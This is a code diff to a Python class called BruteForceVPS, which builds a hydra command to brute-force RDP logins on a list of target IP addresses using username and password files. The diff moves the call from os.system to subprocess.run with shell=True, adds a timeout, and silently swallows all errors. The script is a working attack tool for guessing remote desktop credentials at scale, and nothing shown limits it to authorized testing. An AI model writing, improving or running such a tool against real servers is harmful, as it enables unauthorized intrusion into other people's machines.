@@ -2,6 +2,7 @@ import random
 import socket
 import threading
 import os
+import subprocess
 
 class BruteForceVPS:
     def __init__(self, username="username.txt", password="password.txt", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
@@ -57,7 +58,11 @@ class BruteForceVPS:
             t.join()
     
     def hydra_attack(self, hydra_thread=4):
-        os.system(f"hydra -t {hydra_thread} -L {self.username} -P {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
+        try:
+            subprocess.run(f"hydra -t {hydra_thread} -L {self.username} -P {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp",
+                            shell=True, check=True, timeout=30)
+        except:
+            pass
     
     def clean_hydra_output(self):
         with open(file=self.hydra_output, mode="r", encoding="utf-8") as file:
